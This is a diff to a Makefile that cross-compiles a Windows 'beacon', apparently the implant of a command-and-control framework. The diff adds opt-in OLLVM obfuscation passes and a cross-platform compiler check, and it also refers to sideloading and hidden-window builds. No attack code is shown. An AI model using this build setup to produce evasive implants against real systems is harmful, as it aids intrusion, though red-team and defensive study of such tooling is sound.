@@ -12,8 +12,30 @@ BEACON   := __NAME__
 # MinGW cross-compilers
 CXX_X64  := x86_64-w64-mingw32-g++
 CXX_X86  := i686-w64-mingw32-g++
+
+# ── OLLVM obfuscation (opt-in) ──────────────────────────────────────────────────────────
+# Set OLLVM=1 to switch from standard MinGW g++ to ollvm-mingw clang++.
+# The clang++ binaries must be in the server's PATH.
+# OLLVM_SEED: reproducible seed for OLLVM passes (optional)
+OLLVM      ?= 0
+OLLVM_SEED ?=
+
+ifeq ($(OLLVM),1)
+    CXX_X64 := x86_64-w64-mingw32-clang++
+    CXX_X86 := i686-w64-mingw32-clang++
+    OLLVM_FLAGS := -mllvm -fla -mllvm -sub -mllvm -bcf -mllvm -sobf
+    ifneq ($(OLLVM_SEED),)
+        OLLVM_FLAGS += -mllvm -seed=$(OLLVM_SEED)
+    endif
+endif
+
+ifeq ($(OS),Windows_NT)
 HAS_X64  := $(strip $(shell where $(CXX_X64) 2>nul))
 HAS_X86  := $(strip $(shell where $(CXX_X86) 2>nul))
+else
+HAS_X64  := $(strip $(shell command -v $(CXX_X64) 2>/dev/null))
+HAS_X86  := $(strip $(shell command -v $(CXX_X86) 2>/dev/null))
+endif
 ALL_TARGETS :=
 
 ifneq ($(HAS_X64),)
@@ -38,16 +60,28 @@ CXXFLAGS := -std=c++17 -Os -fno-stack-protector -fno-strict-overflow \
             -fno-delete-null-pointer-checks -fno-strict-aliasing \
             -fno-builtin -fno-exceptions -fno-unwind-tables \
             -fno-asynchronous-unwind-tables -fpermissive -w \
+            -ffunction-sections -fdata-sections \
             -masm=intel -fPIC -I $(SRC_DIR) -I $(SRC_DIR)/impl -I $(SRC_DIR)/protocol -I $(SRC_DIR)/crypto
 
-LDFLAGS  := -s -Wl,-s,--gc-sections -static-libgcc -mwindows
+LDFLAGS  := -s -Wl,-s,--gc-sections -static-libgcc -static-libstdc++ -mwindows
 DEFINES  :=
+
+# Append OLLVM passes when enabled
+ifeq ($(OLLVM),1)
+    CXXFLAGS += $(OLLVM_FLAGS)
+endif
 
 # Sideloading: path to .def file for export forwarding (set by plugin)
 DEFFILE  ?=
 
 # Extra defines injected by server-side plugin (e.g. -DDEBUG -DIAT_DISABLED)
 EXTRA_DEFINES ?=
+
+# Debug builds use console subsystem (no -mwindows) so stdout goes to the
+# calling terminal — matches the Rust agent behavior.
+ifneq ($(findstring -DDEBUG,$(EXTRA_DEFINES)),)
+    LDFLAGS := $(filter-out -mwindows,$(LDFLAGS))
+endif
 
 # Profile header (injected by server-side plugin at build time)
 PROFILE_HEADER ?=
